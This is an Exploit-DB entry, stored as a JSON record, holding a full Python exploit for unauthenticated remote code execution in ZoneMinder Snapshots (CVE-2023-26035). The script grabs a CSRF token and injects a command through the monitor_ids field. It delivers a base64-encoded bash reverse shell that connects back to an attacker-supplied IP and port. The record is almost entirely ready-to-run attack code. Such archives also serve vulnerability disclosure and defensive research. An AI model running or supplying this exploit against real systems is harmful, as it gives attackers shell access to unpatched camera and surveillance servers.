{"source": "https://www.exploit-db.com/exploits/51902", "vulnName": "ZoneMinder Snapshots < 1.37.33 - Unauthenticated RCE", "vulnEDBID": "51902", "vulnCVE": "N/A", "author": "RAVINDU WICKRAMASINGHE", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-18", "vulnContent": "import re\nimport requests\nfrom bs4 import BeautifulSoup\nimport argparse\nimport base64\n\n# Exploit Title: Unauthenticated RCE in ZoneMinder Snapshots\n# Date: 12 December 2023\n# Discovered by : @Unblvr1\n# Exploit Author: Ravindu Wickramasinghe (@rvizx9)\n# Vendor Homepage: https://zoneminder.com/\n# Software Link: https://github.com/ZoneMinder/zoneminder\n# Version: prior to 1.36.33 and 1.37.33\n# Tested on: Arch Linux, Kali Linux\n# CVE : CVE-2023-26035\n# Github Link : https://github.com/rvizx/CVE-2023-26035\n\n\nclass ZoneMinderExploit:\n    def __init__(self, target_uri):\n        self.target_uri = target_uri\n        self.csrf_magic = None\n\n    def fetch_csrf_token(self):\n        print(\"[>] fetching csrt token\")\n        response = requests.get(self.target_uri)\n        self.csrf_magic = self.get_csrf_magic(response)\n        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):\n            print(f\"[>] recieved the token: {self.csrf_magic}\")\n            return True\n        print(\"[!] unable to fetch or parse token.\")\n        return False\n\n    def get_csrf_magic(self, response):\n        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)\n\n    def execute_command(self, cmd):\n        print(\"[>] sending payload..\")\n        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}\n        response = requests.post(f\"{self.target_uri}/index.php\", data=data)\n        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")\n\n    def exploit(self, payload):\n        if self.fetch_csrf_token():\n            print(f\"[>] executing...\")\n            self.execute_command(payload)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')\n    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')\n    parser.add_argument('-p', '--port', required=True, help='port')\n    args = parser.parse_args()\n\n    # generating the payload\n    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"  \n    ps2 = base64.b64encode(ps1.encode()).decode()\n    payload = f\"echo {ps2} | base64 -d | /bin/bash\"\n\n    ZoneMinderExploit(args.target_url).exploit(payload)\n            "}